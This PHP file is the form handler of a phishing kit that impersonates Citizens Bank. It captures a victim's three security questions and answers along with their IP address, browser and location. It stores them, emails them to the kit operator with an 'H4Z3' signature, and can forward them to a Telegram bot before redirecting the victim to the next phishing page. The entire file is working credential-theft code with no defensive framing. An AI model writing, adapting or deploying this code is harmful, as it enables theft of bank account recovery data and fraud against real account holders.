<?php
include '../settings.php';
include 'functions.php';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $q1 = $_POST['q1'];
    $a1 = $_POST['a1'];
    $q2 = $_POST['q2'];
    $a2 = $_POST['a2'];
    $q3 = $_POST['q3'];
    $a3 = $_POST['a3'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $ip = getenv("REMOTE_ADDR");

    h4z3_store_submission('security', $_POST);

            $body  = "++++++++++ 🐱‍💻 CITIZEN BANK SECURITY QUESTIONS 🐱‍💻 ++++++++++\r\n";
            $body .= "Question 1  : $q1\r\n";
            $body .= "Answer 1    : $a1\r\n";
            $body .= "Question 2  : $q2\r\n";
            $body .= "Answer 2    : $a2\r\n";
            $body .= "Question 3  : $q3\r\n";
            $body .= "Answer 3    : $a3\r\n";
            $body .= "|--------------- I N F O | I P -------------------|\r\n";
            $body .= "IP          : $ip\r\n";
            $body .= "User Agent  : $user_agent\r\n";
            $body .= "Country     : $cn\r\n";
            $body .= "Region      : $regioncity\r\n";
            $body .= "City        : $citykota\r\n";
            $body .= "OS / BR     : $os / $br\r\n";
            $body .= "Timezone    : $timezone\r\n";
            $body .= "Date        : $date\r\n";
            $body .= "+++++++++++++++ ‍H4Z3 +++++++++++++++\r\n";


      $subject  = "🐱‍💻 ‍H4Z3 CITIZEN BANK SECURITY QUESTIONS => FROM $ip 🐱‍💻";
      $headers  = "From: 🐱‍💻 ‍H4Z3 🐱‍💻 <m4r1ju4n4r3sult@h4z3.com>\r\n";
      $headers .= "MIME-Version: 1.0\r\n";
      $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    mail($to,$subject,$body,$headers);

    if($tgresult == "on"){
        require"$data";
        $data = $body;
          $send = ['chat_id'=>$chatid,'text'=>$data];
          $website = "https://api.telegram.org/{$boturl}";
          $ch = curl_init($website . '/sendMessage');
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
          $result = curl_exec($ch);
          curl_close($ch);
        }

    header('Location: ../personal');
    exit;
}
?>
